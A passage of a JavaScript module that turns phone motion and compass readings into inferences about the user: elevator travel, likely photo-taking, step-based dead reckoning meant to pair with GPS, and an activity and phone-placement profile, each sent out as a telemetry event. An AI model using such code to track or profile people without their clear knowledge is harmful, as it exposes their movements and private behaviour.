  if (!await _ensurePermission()) {
    queueEvent('motion_elevator', { error: 'not_granted' }); flush().catch(() => {}); return;
  }
  const { samples } = await _collectSamples(durationMs);
  if (samples.length < 10) {
    queueEvent('motion_elevator', { error: 'no_data' }); flush().catch(() => {}); return;
  }

  // Net vertical acceleration (removing gravity ~9.8 from Z when portrait)
  const azVals = samples.map(s => s.az);
  const azSt = _stats(azVals);
  // Gravity component ≈ azMean; residual = net vertical acceleration
  const netVert = azVals.map(az => az - azSt.mean);
  const netSt = _stats(netVert.map(Math.abs));

  // Elevator signature: sustained non-zero net vertical + stable orientation (low gyro)
  const rotSt = _stats(samples.map(s => _mag(s.rA, s.rB, s.rG)));
  const durationSec = (samples[samples.length - 1].t - samples[0].t) / 1000;

  // Detect ascent/descent phases (positive/negative net vertical)
  const ascentFrames  = netVert.filter(v => v >  0.5).length;
  const descentFrames = netVert.filter(v => v < -0.5).length;
  const totalFrames   = samples.length;

  let verdict;
  if (netSt.mean < 0.15)                    verdict = 'no_elevator_detected';
  else if (ascentFrames > totalFrames * 0.3) verdict = 'ascending';
  else if (descentFrames > totalFrames * 0.3) verdict = 'descending';
  else                                        verdict = 'elevator_movement';

  // Estimate speed (crude: integrate net vertical accel)
  let velocityMs = 0;
  const dt = durationSec / samples.length;
  netVert.forEach(a => { velocityMs += a * dt; });

  queueEvent('motion_elevator', {
    ts: Date.now(), durationSec: _r(durationSec, 1),
    verdict, netVertStd: netSt.mean,
    ascentRatio:  _r(ascentFrames / totalFrames, 2),
    descentRatio: _r(descentFrames / totalFrames, 2),
    estimatedVelocityMs: _r(velocityMs, 2),
    rotationStd: rotSt.std,
  });
  flush().catch(() => {});
}

// ── 9. Photo-taking detection ─────────────────────────────────────────────────

export async function detectPhoto({ durationMs = 5000 } = {}) {
  if (!await _ensurePermission()) {
    queueEvent('motion_photo', { error: 'not_granted' }); flush().catch(() => {}); return;
  }
  const { samples } = await _collectSamples(durationMs);
  if (samples.length < 10) {
    queueEvent('motion_photo', { error: 'no_data' }); flush().catch(() => {}); return;
  }

  // Photo signature:
  // 1. Device raised (beta angle change toward 70-80°)
  // 2. Brief stable period (< 0.3 std in mags over 300-500ms window)
  // 3. Sharp small impact (shutter button press ≈ 0.5-1.5 m/s² spike)
  // 4. Device lowered again

  const mags   = samples.map(s => _mag(s.ax, s.ay, s.az));
  const rotVals = samples.map(s => _mag(s.rA, s.rB, s.rG));
  const magSt  = _stats(mags);
  const rotSt  = _stats(rotVals);

  const windowSize = Math.max(3, Math.floor(samples.length / 8));
  let minWindowStd = Infinity;
  for (let i = 0; i < mags.length - windowSize; i++) {
    const w = mags.slice(i, i + windowSize);
    const { std } = _stats(w);
    if (std < minWindowStd) minWindowStd = std;
  }

  // Small spike after stable period (shutter press)
  let shutterCandidate = false;
  const threshold = magSt.mean + 1.5;
  for (let i = 5; i < mags.length - 1; i++) {
    const prevStd = _stats(mags.slice(Math.max(0, i - 5), i)).std;
    if (prevStd < 0.3 && mags[i] > threshold) { shutterCandidate = true; break; }
  }

  const photoLikely = minWindowStd < 0.2 && shutterCandidate;

  queueEvent('motion_photo', {
    ts: Date.now(), durationSec: _r(durationMs / 1000, 1),
    photoLikely,
    minStableWindowStd: _r(minWindowStd, 3),
    shutterCandidateDetected: shutterCandidate,
    magStd: magSt.std, rotMean: rotSt.mean,
  });
  flush().catch(() => {});
}

// ── 10. Dead reckoning ────────────────────────────────────────────────────────

export async function computeDeadReckoning({ durationMs = 20000, stepLengthM = 0.7 } = {}) {
  if (!await _ensurePermission()) {
    queueEvent('motion_dead_reckoning', { error: 'not_granted' }); flush().catch(() => {}); return;
  }
  const { samples, compass } = await _collectSamples(durationMs);
  if (samples.length < 10) {
    queueEvent('motion_dead_reckoning', { error: 'no_data' }); flush().catch(() => {}); return;
  }

  const durationSec = (samples[samples.length - 1].t - samples[0].t) / 1000;
  const stepTs = _detectSteps(samples);
  const distM  = stepTs.length * stepLengthM;

  // Compute compass heading per step (or use average if sparse)
  const compasses = compass.map(c => c.h).filter(h => h != null);
  const avgHeading = compasses.length
    ? _r(compasses.reduce((a, b) => a + b, 0) / compasses.length, 1) : null;

  // Build displacement vector
  let dx = 0, dy = 0;
  if (avgHeading != null) {
    const rad = avgHeading * Math.PI / 180;
    dx = _r(distM * Math.sin(rad), 2);  // East component
    dy = _r(distM * Math.cos(rad), 2);  // North component
  }

  // Segment-level headings (every ~2s)
  const segmentSize = Math.floor(samples.length / Math.max(1, Math.floor(durationSec / 2)));
  const headingTrack = [];
  for (let i = 0; i < compasses.length; i += Math.max(1, Math.floor(compasses.length / 10))) {
    headingTrack.push({ t: compass[i]?.t, h: compasses[i] });
  }

  queueEvent('motion_dead_reckoning', {
    ts: Date.now(), durationSec: _r(durationSec, 1),
    stepCount: stepTs.length, stepLengthM,
    distanceM: _r(distM, 1),
    avgHeading, cardinal: avgHeading != null ? _cardinal(avgHeading) : null,
    displacement: { dx, dy },
    headingTrack,
    note: 'relative displacement from start point — combine with GPS fix for absolute positioning',
  });
  flush().catch(() => {});
}

// ── 11. Behavioral baseline snapshot ─────────────────────────────────────────

export async function profileBehavior({ durationMs = 10000 } = {}) {
  if (!await _ensurePermission()) {
    queueEvent('motion_profile', { error: 'not_granted' }); flush().catch(() => {}); return;
  }
  const { samples, compass } = await _collectSamples(durationMs);
  if (samples.length < 10) {
    queueEvent('motion_profile', { error: 'no_data' }); flush().catch(() => {}); return;
  }

  const mags      = samples.map(s => _mag(s.ax, s.ay, s.az));
  const magSt     = _stats(mags);
  const rotVals   = samples.map(s => _mag(s.rA, s.rB, s.rG));
  const rotSt     = _stats(rotVals);
  const durationSec = (samples[samples.length - 1].t - samples[0].t) / 1000;
  const stepTs    = _detectSteps(samples);
  const cadence   = _r(stepTs.length / durationSec * 60, 1);

  const compasses = compass.map(c => c.h).filter(h => h != null);
  const avgHeading = compasses.length
    ? _r(compasses.reduce((a, b) => a + b, 0) / compasses.length, 1) : null;

  // Derive activity
  const microHz = _dominantHz(samples.map(s => s.rA), durationSec);
  const vehicleVib = microHz != null && microHz > 15 && magSt.std < 1.5;
  let activity;
  if (magSt.std < 0.25)                    activity = 'stationary';
  else if (vehicleVib)                      activity = 'in_vehicle';
  else if (cadence >= 20 && cadence <= 80)  activity = 'walking';
  else if (cadence > 80)                    activity = 'running';
  else                                      activity = 'unknown';

  // Context
  const axM = samples.reduce((a, s) => a + s.ax, 0) / samples.length;
  const azM = samples.reduce((a, s) => a + s.az, 0) / samples.length;
  let context;
  if (magSt.std < 0.3) {
    context = Math.abs(azM) > 8.5 ? (azM > 0 ? 'face_down' : 'face_up') : 'flat';
  } else if (magSt.std < 1.0) {
    context = 'in_pocket_or_bag';
  } else {
    context = 'held_active';
  }

  queueEvent('motion_profile', {
    ts: Date.now(), durationSec: _r(durationSec, 1),
    activity, context, cadence,
    stepCount: stepTs.length,
    compassHeading: avgHeading, cardinal: avgHeading != null ? _cardinal(avgHeading) : null,
    mag: magSt, rot: rotSt,
    estDistanceM: _r(stepTs.length * 0.7, 1),
  });
  flush().catch(() => {});
}
